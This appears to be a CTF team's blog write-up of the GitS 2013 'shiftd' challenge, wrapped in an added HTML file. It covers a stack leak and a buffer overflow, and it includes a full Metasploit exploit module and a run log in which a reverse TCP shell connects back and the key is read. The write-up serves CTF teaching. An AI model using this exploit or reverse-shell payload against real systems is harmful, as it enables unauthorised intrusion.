@@ -1,0 +1,611 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>GitS 2013 - Shiftd - CaptchaFlag CTF Team</title>
+  <meta name="author" content="Captchaflag">
+
+  
+  <meta name="description" content="Challenge Points: 100 Find the key! (File running at shiftd.2013.ghostintheshellcode.com:5177) Analysis 64-bit ELF. Note that unlike most challenges &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://www.captchaflag.com/blog/2013/02/17/gits-2013-shiftd/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="/javascripts/ender.js"></script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <link href="/atom.xml" rel="alternate" title="CaptchaFlag CTF Team" type="application/atom+xml">
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-37376887-1']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">CaptchaFlag CTF Team</a></h1>
+  
+    <h2>Blog by the Captchaflag CTF Team</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:www.captchaflag.com" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">GitS 2013 - Shiftd</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-02-17T13:57:00-05:00" pubdate data-updated="true">Feb 17<span>th</span>, 2013</time>
+        
+         | <a href="#disqus_thread">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><h2>Challenge</h2>
+
+<p>Points: 100</p>
+
+<p>Find the key! (<a href="https://2013.ghostintheshellcode.com/shiftd-3a9c2a55e77d1467ee46dfb931170c737d24f310">File</a> running at shiftd.2013.ghostintheshellcode.com:5177)</p>
+
+<h2>Analysis</h2>
+
+<p>64-bit ELF. Note that unlike most challenges this app read from STDIN. In order to make it a networked service, we can run the following:
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>stacks0n@ubuntu:~/Desktop<span class="nv">$ </span>nc -l -p 5177 -e ./shiftd
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Closes connection after sending any data for the most part. Open up in IDA and notice the following:
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>.text:0000000000400A42                 mov     edx, 0Ah
+</span><span class='line'>.text:0000000000400A47                 mov     esi, 64
+</span><span class='line'>.text:0000000000400A4C                 mov     rdi, rax
+</span><span class='line'>.text:0000000000400A4F                 call    sub_4007F4
+</span><span class='line'>.text:0000000000400A54                 lea     rax, <span class="o">[</span>rbp-40h<span class="o">]</span>
+</span><span class='line'>.text:0000000000400A58                 lea     rsi, aNowisthewinter ; <span class="s2">&quot;NowIsTheWinterOfOurDiscountTent&quot;</span>
+</span><span class='line'>.text:0000000000400A5F                 mov     rdi, rax
+</span><span class='line'>.text:0000000000400A62                 call    _strcmp
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>So, need to send special passphrase of &quot;NowIsTheWinterOfOurDiscountTent&quot;.</p>
+
+<p>Test run of the application:
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>nc shiftd.2013.ghostintheshellcode.com 5177
+</span><span class='line'>NowIsTheWinterOfOurDiscountTent
+</span><span class='line'>Welcome to Shifty<span class="err">&#39;</span>s Time Formatting Service!
+</span><span class='line'>What is your name?
+</span><span class='line'>stacks0n
+</span><span class='line'>Welcome, stacks0n
+</span><span class='line'>                  @!
+</span><span class='line'>Please provide a <span class="nb">time </span>format:
+</span><span class='line'>%D
+</span><span class='line'>Your formatted <span class="nb">time </span>is:
+</span><span class='line'>02/16/13
+</span><span class='line'>
+</span><span class='line'>Thank you! Come again!
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>When our username is returned to us, we notice a bunch of other data being printed out as well.</p>
+
+<p>sub_4007F4() is responsible for reading data from the socket. The prototype seems to be something like:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>read_from_socket<span class="o">(</span>buffer, size, delimeter<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+where the arguments are passed in registers. The delimeter is always specified by 0x0A (newline). The method reads one byte at a time until size is met or the delimeter is reached.
+
+Since buffers are not cleared out or null terminated, stack data is leaked when our username is printed back out to us. This is especially handy since the data contains a stack pointer which can later help us redirect execution. Note that the stack is executable, but randomized.
+
+Unfortunately, I spent too much time focusing on the call to strftime() and its format specifiers. Although you can prepend padding (&#8216;%100D&#8217;), there is no &#8216;%n&#8217; to write the number of bytes written.
+
+The code for reading in the format string is as follows:
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>.text:0000000000400931                 mov     rax, cs:off_601068
+</span><span class='line'>.text:0000000000400938                 mov     rcx, rax
+</span><span class='line'>.text:000000000040093B                 and     ecx, 7FFFFFFFh
+</span><span class='line'>.text:0000000000400941                 lea     rax, <span class="o">[</span>rbp+format<span class="o">]</span>
+</span><span class='line'>.text:0000000000400948                 mov     edx, 0Ah
+</span><span class='line'>.text:000000000040094D                 mov     rsi, rcx
+</span><span class='line'>.text:0000000000400950                 mov     rdi, rax
+</span><span class='line'>.text:0000000000400953                 call    read_from_socket
+</span></code></pre></td></tr></table></div></figure>
+
+<p>Note that the format string buffer is size 1024, and the call is:
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>read<em>from</em>socket<span class="o">(</span>format, 0x6014b0, <span class="s1">&#39;\n&#39;</span><span class="o">)</span>.
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>So there we have it, a stack based buffer overflow. 1064 bytes until we reach the stored return address on the stack. By leveraging the leaked stack pointer, we can redirect execution to our embedded shellcode.</p>
+
+<p>MSF Module:
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">##</span>
+</span><span class='line'><span class="c1"># This file is part of the Metasploit Framework and may be subject to</span>
+</span><span class='line'><span class="c1"># redistribution and commercial restrictions. Please see the Metasploit</span>
+</span><span class='line'><span class="c1"># web site for more information on licensing and terms of use.</span>
+</span><span class='line'><span class="c1">#   http://metasploit.com/</span>
+</span><span class='line'><span class="c1">##</span>
+</span><span class='line'>
+</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;msf/core&#39;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">class</span> <span class="nc">Metasploit3</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span>
+</span><span class='line'>        <span class="no">Rank</span> <span class="o">=</span> <span class="no">GreatRanking</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="kp">include</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span><span class="o">::</span><span class="no">Tcp</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">info</span> <span class="o">=</span> <span class="p">{})</span>
+</span><span class='line'>                <span class="k">super</span><span class="p">(</span><span class="n">update<em>info</span><span class="p">(</span><span class="n">info</span><span class="p">,</span>
+</span><span class='line'>                        <span class="s1">&#39;Name&#39;</span>           <span class="o">=&gt;</span> <span class="s1">&#39;GitS 2013 Pwnable 100 - shiftd&#39;</span><span class="p">,</span>
+</span><span class='line'>                        <span class="s1">&#39;Author&#39;</span>         <span class="o">=&gt;</span> <span class="o">[</span> <span class="s1">&#39;stacks0n&#39;</span><span class="p">,</span> <span class="s1">&#39;hubris&#39;</span> <span class="o">]</span><span class="p">,</span>
+</span><span class='line'>                        <span class="s1">&#39;Privileged&#39;</span>     <span class="o">=&gt;</span> <span class="kp">false</span><span class="p">,</span>
+</span><span class='line'>                        <span class="s1">&#39;Platform&#39;</span>       <span class="o">=&gt;</span> <span class="o">[</span> <span class="s1">&#39;linux&#39;</span> <span class="o">]</span><span class="p">,</span>
+</span><span class='line'>                        <span class="s1">&#39;Arch&#39;</span>           <span class="o">=&gt;</span> <span class="no">ARCH</em>X86<em>64</span><span class="p">,</span>
+</span><span class='line'>                        <span class="s1">&#39;Targets&#39;</span>        <span class="o">=&gt;</span> <span class="o">[</span> <span class="o">[</span> <span class="s1">&#39;Automatic&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="p">}</span>  <span class="o">]</span><span class="p">,</span> <span class="o">]</span><span class="p">,</span>
+</span><span class='line'>                        <span class="s1">&#39;DefaultTarget&#39;</span>  <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'>                <span class="n">register</em>options</span><span class="p">(</span>
+</span><span class='line'>                        <span class="o">[</span>
+</span><span class='line'>                                <span class="no">Opt</span><span class="o">::</span><span class="no">RHOST</span><span class="p">(</span><span class="s1">&#39;54.235.156.9&#39;</span><span class="p">),</span>
+</span><span class='line'>                                <span class="no">Opt</span><span class="o">::</span><span class="no">RPORT</span><span class="p">(</span><span class="mi">5177</span><span class="p">)</span>
+</span><span class='line'>                        <span class="o">]</span><span class="p">,</span> <span class="nb">self</span><span class="o">.</span><span class="n">class</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="k">def</span> <span class="nf">exploit</span>
+</span><span class='line'>                <span class="n">connect</span>
+</span><span class='line'>
+</span><span class='line'>                <span class="c1"># send the secret password</span>
+</span><span class='line'>                <span class="c1"># we can send extra data, not that it matters</span>
+</span><span class='line'>                <span class="n">sock</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="s2">&quot;NowIsTheWinterOfOurDiscountTent</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;A&quot;</span> <span class="o"><em></span> <span class="mi">32</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span class='line'>                <span class="n">print<em>status</span> <span class="n">sock</span><span class="o">.</span><span class="n">get</em>once</span>
+</span><span class='line'>
+</span><span class='line'>                <span class="c1"># send the username</span>
+</span><span class='line'>                <span class="n">sock</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="s2">&quot;|</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span class='line'>                <span class="n">resp</span> <span class="o">=</span> <span class="n">print<em>status</span> <span class="n">sock</span><span class="o">.</span><span class="n">get</em>once</span>
+</span><span class='line'>
+</span><span class='line'>                <span class="c1"># process the stack address that is leaked to us</span>
+</span><span class='line'>                <span class="n">stack<em>addr</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="n">resp</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;|&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">last</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;!&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">first</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x00\x00</span><span class="s2">&quot;</span>
+</span><span class='line'>
+</span><span class='line'>                <span class="c1"># subtract some off this stack addres to allow us more room for</span>
+</span><span class='line'>                <span class="c1"># nop sled and shellcode</span>
+</span><span class='line'>                <span class="n">stack</em>addr</span> <span class="o">=</span> <span class="o">[</span><span class="n">stack<em>addr</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">first</span> <span class="o">-</span> <span class="mh">0x100</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>                <span class="c1"># send the format string for strftime()</span>
+</span><span class='line'>                <span class="c1"># overflow alert!</span>
+</span><span class='line'>                <span class="n">payload</em>size</span> <span class="o">=</span> <span class="mi">1064</span>
+</span><span class='line'>                <span class="n">junk</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o"></em></span> <span class="mi">48</span> <span class="c1"># we don&#39;t want to trash our payload with push&#39;s</span>
+</span><span class='line'>                <span class="nb">p</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">payload<em>size</span> <span class="o">-</span> <span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">encoded</span><span class="o">.</span><span class="n">size</span> <span class="o">+</span> <span class="n">junk</span><span class="o">.</span><span class="n">size</span><span class="p">))</span>
+</span><span class='line'>                <span class="nb">p</span> <span class="o">+=</span> <span class="n">payload</span><span class="o">.</span><span class="n">encoded</span> <span class="o">+</span> <span class="n">junk</span>
+</span><span class='line'>
+</span><span class='line'>                <span class="c1"># send the payload</span>
+</span><span class='line'>                <span class="n">sock</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="nb">p</span> <span class="o">+</span> <span class="n">stack</em>addr</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span class='line'>                <span class="n">print<em>status</span> <span class="n">sock</span><span class="o">.</span><span class="n">get</em>once</span>
+</span><span class='line'>
+</span><span class='line'>                <span class="n">handler</span>
+</span><span class='line'>                <span class="n">disconnect</span>
+</span><span class='line'>        <span class="k">end</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf  exploit<span class="o">(</span>shiftd<span class="o">)</span> &gt; show options
+</span><span class='line'>
+</span><span class='line'>Module options <span class="o">(</span>exploit/gits/shiftd<span class="o">)</span>:
+</span><span class='line'>
+</span><span class='line'>   Name   Current Setting  Required  Description
+</span><span class='line'>   ----   ---------------  --------  -----------
+</span><span class='line'>   RHOST  204.236.213.69   yes       The target address
+</span><span class='line'>   RPORT  5177             yes       The target port
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Payload options <span class="o">(</span>linux/x64/shell<em>reverse</em>tcp<span class="o">)</span>:
+</span><span class='line'>
+</span><span class='line'>   Name   Current Setting  Required  Description
+</span><span class='line'>   ----   ---------------  --------  -----------
+</span><span class='line'>   LHOST  50.142.246.171   yes       The listen address
+</span><span class='line'>   LPORT  4444             yes       The listen port
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Exploit target:
+</span><span class='line'>
+</span><span class='line'>   Id  Name
+</span><span class='line'>   --  ----
+</span><span class='line'>   0   Automatic
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>msf  exploit<span class="o">(</span>shiftd<span class="o">)</span> &gt; exploit
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>-<span class="o">]</span> Handler failed to <span class="nb">bind </span>to 50.142.246.171:4444
+</span><span class='line'><span class="o">[</span><em><span class="o">]</span> Started reverse handler on 0.0.0.0:4444
+</span><span class='line'><span class="o">[</span></em><span class="o">]</span> Welcome to Shifty<span class="err">&#39;</span>s Time Formatting Service!
+</span><span class='line'>What is your name?
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span><em><span class="o">]</span> Welcome, |??<span class="o">(</span>!
+</span><span class='line'>Please provide a <span class="nb">time </span>format:
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span></em><span class="o">]</span> Your formatted <span class="nb">time </span>is:
+</span><span class='line'>??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????j<span class="o">)</span>X?j_j^H?H?
+</span><span class='line'>
+</span><span class='line'>Thank you! Come again!
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Command shell session 1 opened <span class="o">(</span>192.168.1.101:4444 -&gt; 204.236.213.69:36107<span class="o">)</span> at 2013-02-16 16:49:49 -0500
+</span><span class='line'>
+</span><span class='line'>cat key
+</span><span class='line'>cat: key: No such file or directory
+</span><span class='line'>whoami
+</span><span class='line'>shiftd
+</span><span class='line'><span class="nb">cd</span> /home/shiftd
+</span><span class='line'>ls
+</span><span class='line'>key
+</span><span class='line'>shiftd
+</span><span class='line'>cat key
+</span><span class='line'>http://shifty.urbanup.com/4195551
+</span></code></pre></td></tr></table></div></figure></p>
+
+<h2>Solution</h2>
+
+<p>http://shifty.urbanup.com/4195551</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">stacks0n</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-02-17T13:57:00-05:00" pubdate data-updated="true">Feb 17<span>th</span>, 2013</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/pwnable/'>pwnable</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://www.captchaflag.com/blog/2013/02/17/gits-2013-shiftd/" data-via="captchaflag" data-counturl="http://www.captchaflag.com/blog/2013/02/17/gits-2013-shiftd/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2013/02/17/gits-2013-funny-business/" title="Previous Post: GitS 2013 - Funny Business">&laquo; GitS 2013 - Funny Business</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2013/10/27/hacklu-2013-robots-exclusion-committee/" title="Next Post: Hacklu 2013 - Robots Exclusion Committee">Hacklu 2013 - Robots Exclusion Committee &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/10/28/hack-dot-lu-2014-guess-the-flag/">Hack.lu 2014 - Guess the Flag</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/10/24/hack-dot-lu-2014-daltons-corporate-security-safe-for-business/">Hack.lu 2014 - Dalton's Corporate Security Safe for Business</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/10/24/hack-dot-lu-2014-douchemac/">Hack.lu 2014 - Douchemac</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/10/24/hack-dot-lu-2014-imageupload/">Hack.lu 2014 - ImageUpload</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/10/23/hack-dot-lu-2014-wiener/">Hack.lu 2014 - wiener</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+<section>
+  <h1>Latest Tweets</h1>
+  <ul id="tweets">
+    <li class="loading">Status updating...</li>
+  </ul>
+  <script type="text/javascript">
+    $.domReady(function(){
+      getTwitterFeed("captchaflag", 4, false);
+    });
+  </script>
+  <script src="/javascripts/twitter.js" type="text/javascript"> </script>
+  
+    <a href="http://twitter.com/captchaflag" class="twitter-follow-button" data-show-count="false">Follow @captchaflag</a>
+  
+</section>
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - Captchaflag -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'captchaflag';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://www.captchaflag.com/blog/2013/02/17/gits-2013-shiftd/';
+        var disqus_url = 'http://www.captchaflag.com/blog/2013/02/17/gits-2013-shiftd/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
